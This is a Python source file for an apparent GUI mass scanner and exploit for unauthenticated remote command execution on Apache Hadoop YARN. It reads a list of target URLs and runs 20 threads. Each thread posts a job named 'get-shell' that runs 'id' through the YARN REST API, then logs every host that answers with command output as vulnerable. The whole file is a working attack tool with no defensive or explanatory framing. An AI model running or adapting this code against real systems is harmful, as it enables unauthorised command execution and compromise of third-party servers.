import requests
import urllib3
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def Apache_Hadoop_Yarn_RPC_RCE_exp(url):
    poc = r"""/ws/v1/cluster/apps"""
    url1 = url + poc
    newurl = url1.split('//')[1].split('/')[0]
    if ":" not in str(newurl):
        pass
    else:
        host = newurl.split(':')[0]
        port = newurl.split(':')[1]
        headers = {
            "host": f'{host}:{port}',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "167",
            "Content-Type": "application/json",
            "User-Agent": "Serein v2.7"
        }
        data = {"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"}
        proxies = {
            "http": "http://127.0.0.1:7890",
            "https": "https://127.0.0.1:7890"
        }
        try:
            res = requests.post(url1, headers=headers,proxies=proxies,json=data,verify=False,timeout=3)
            if "groups=" in res.text:
                Apache_Hadoop_Yarn_RPC_RCE_text.insert(END,"【！！！！！！】存在漏洞的url：" + url1 + "\n")
                Apache_Hadoop_Yarn_RPC_RCE_text.see(END)
                print(res.text)
                with open ("存在Apache Hadoop Yarn RPC 远程命令执行漏洞的url.txt", 'a') as f:
                    f.write(url1 + "\n")
            else:
                Apache_Hadoop_Yarn_RPC_RCE_text.insert(END,"【×】不存在漏洞的url：" + url1 + "\n")
                Apache_Hadoop_Yarn_RPC_RCE_text.see(END)
        except Exception as err:
            Apache_Hadoop_Yarn_RPC_RCE_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
            Apache_Hadoop_Yarn_RPC_RCE_text.see(END)
def get_Apache_Hadoop_Yarn_RPC_RCE_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Apache_Hadoop_Yarn_RPC_RCE_gui():
    Apache_Hadoop_Yarn_RPC_RCE = tk.Tk()
    Apache_Hadoop_Yarn_RPC_RCE.geometry("910x450")
    Apache_Hadoop_Yarn_RPC_RCE.title("Apache Hadoop Yarn RPC 远程命令执行漏洞一把梭")
    Apache_Hadoop_Yarn_RPC_RCE.resizable(0, 0)
    Apache_Hadoop_Yarn_RPC_RCE.iconbitmap('logo.ico')
    global Apache_Hadoop_Yarn_RPC_RCE_text
    Apache_Hadoop_Yarn_RPC_RCE_text = scrolledtext.ScrolledText(Apache_Hadoop_Yarn_RPC_RCE,width=123, height=25)
    Apache_Hadoop_Yarn_RPC_RCE_text.grid(row=0, column=0, padx=10, pady=10)
    Apache_Hadoop_Yarn_RPC_RCE_text.see(END)
    addrs = get_Apache_Hadoop_Yarn_RPC_RCE_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Apache_Hadoop_Yarn_RPC_RCE_exp, addr)
    Apache_Hadoop_Yarn_RPC_RCE.mainloop()
